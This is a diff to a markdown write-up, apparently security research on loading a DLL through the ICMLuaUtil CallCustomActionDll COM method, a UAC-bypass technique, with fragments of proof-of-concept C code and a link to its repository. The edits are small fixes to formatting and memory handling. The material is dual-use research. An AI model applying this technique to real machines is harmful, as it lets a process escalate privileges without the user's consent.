@@ -387,7 +387,7 @@ DWORD testFunction(ULONG arg1, HMODULE hModule, LPCSTR arg3)
     return 0;
 }
 ```
-The helper function:  ***BOOL isProcessElevated()*** calls ***OpenProcessToken*** and ***GetTokenInformation***to determine whether the current process is running with an elevated token.
+The helper function:  ***BOOL isProcessElevated()*** calls ***OpenProcessToken*** and ***GetTokenInformation*** to determine whether the current process is running with an elevated token.
 
 ###### Matching the Expected Export Signature
 One of the most important implementation details is that the exported function inside the DLL must be compatible with the invocation pattern used by  CallCustomActionDll
@@ -605,10 +605,10 @@ int main()
 	PWCHAR Buffer = NULL;
 	LPCWSTR Out = NULL;
 	ICMLuaUtil* Util = NULL;
-    	ULONG* outParam = (ULONG*)malloc(sizeof(ULONG));
-    	HMODULE hModule = NULL;
-    	BIND_OPTS3 BindOpts;
-    	*outParam = 0;
+  ULONG outParam = 0;
+  HMODULE hModule = NULL;
+  BIND_OPTS3 BindOpts;
+    	
     
     
 	LPCWSTR dllPath = DLL_PATH;
@@ -658,7 +658,7 @@ int main()
 	exportName, 
 	param3, 
 	param4, 
-	outParam
+	&outParam
 );
 
 if (!SUCCEEDED(hResult))
@@ -682,8 +682,6 @@ _EXIT_ROUTINE:
     CoUninitialize();
 
     return ERROR_SUCCESS;
-
-	return 0;
 }
 ```
 The full source is provided in the [Github Link](https://github.com/coded-intruder/CallCustomActionDll-POC)
